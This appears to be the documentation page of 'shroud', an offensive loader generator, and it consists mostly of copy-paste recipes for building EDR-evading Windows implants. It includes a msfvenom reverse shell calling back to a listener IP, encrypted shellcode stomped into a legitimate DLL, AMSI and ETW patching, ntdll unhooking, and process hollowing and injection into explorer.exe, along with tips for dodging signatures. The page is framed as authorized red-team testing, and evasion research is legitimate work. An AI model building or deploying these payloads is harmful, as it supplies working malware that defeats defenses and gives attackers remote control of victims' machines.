# Payload recipes

Copy-paste recipes for common engagements. All assume you are **authorized**
to test the target and have run `./shroud authorize` once.

`shroud` ships no operational shellcode — stage your own from your tooling
(`msfvenom`, `donut`, `sliver`/`havoc` shellcode, custom). Without `-s`, a
benign **demo stub** is embedded so you can smoke-test the build pipeline.

> The single best starting point for a modern EDR test is `pe26` with the full
> stack — see **The modern implant** below.

---

## The modern implant — test this against your EDR

```bash
# canonical detection pop test
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.bin EXITFUNC=thread

./shroud generate pe26 -s sc.bin \
    -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd
```

What that build gives you:

- `aes` — shellcode AES-256-CBC encrypted at rest (0 msfvenom-prologue matches)
- `stomp` — payload lands inside a legit module's `.text` (file-backed RX)
- `callbacks` — runs via `CreateTimerQueueTimer`, no `CreateThread`
- `dynamic-api` (+ FNV) — all Win32 APIs PEB-resolved, clean IAT
- `amsi` / `etw` — runtime-patched, hash-resolved (no plaintext strings)
- `unhook-kd` — ntdll `.text` restored from `\KnownDlls\ntdll.dll`

---

## Reverse shell

```bash
# set YOUR listener IP/port
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
    -f raw -o sc.bin EXITFUNC=thread

./shroud generate pe26 -s sc.bin \
    -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd
```

```bash
nc -lvnp 4444        # your listener
```

---

## Donut a .NET / PE / DLL payload, then stage it

```bash
donut -i payload.exe -o sc.bin -a 2 -b 1     # x64, optimize 1
./shroud generate pe26 -s sc.bin -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd
```

---

## Output formats

```bash
# Windows DLL (exports DllMain -> runs payload on load)
./shroud generate pe26 -s sc.bin -f dll -e aes,stomp,callbacks,dynamic-api

# source-only (review the C before building; no compile)
./shroud generate pe26 -s sc.bin -f c -e aes,stomp,callbacks
cd out/pe26 && make
```

---

## Drop layers to isolate what a sensor catches

```bash
# everything
./shroud generate pe26 -s sc.bin -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd

# remove module stomping
./shroud generate pe26 -s sc.bin -e aes,callbacks,dynamic-api,etw,amsi,unhook-kd

# remove callback execution
./shroud generate pe26 -s sc.bin -e aes,stomp,dynamic-api,etw,amsi,unhook-kd

# minimal: just AES + dynamic-api
./shroud generate pe26 -s sc.bin -e aes,dynamic-api
```

---

## Classic techniques (single-primitive, educational)

```bash
# process hollowing (payload runs under a legit process identity)
./shroud generate pe08 -s sc.bin

# indirect syscalls into a remote process (strongest userland execution)
./shroud generate pe25 -s sc.bin --process explorer.exe -e rc4,etw

# classic remote thread + API obfuscation (legacy/lab hosts)
./shroud generate pe02 -s sc.bin --process explorer.exe -e dynamic-api,rc4,etw

# classic DLL injection (LoadLibrary path; DLL must exist on disk)
./shroud generate pe05 --dll 'C:\tools\panda.dll' --process explorer.exe
```

---

## Tips

- **Keys**: omit `--aes-key` / `--rc4-key` / `--xor-key` and shroud generates a
  random one each build. To reproduce a build, capture the key from the
  generated `main.c` (`g_key[]` / `g_iv[]`).
- **Stomping target**: `--stomp-dll cfgmgr32.dll` (or any large legit DLL not
  already loaded by the host). Default `xpsprint.dll`.
- **Hash**: `--hash ror13` to fall back to the legacy, more-signatured algorithm
  (useful when a target's detections are tuned for FNV patterns — rare).
- **The residual `VirtualProtect` import** you'll see in any build is baseline
  mingw-CRT noise (present in an empty `int main(){}`), not an injection indicator.
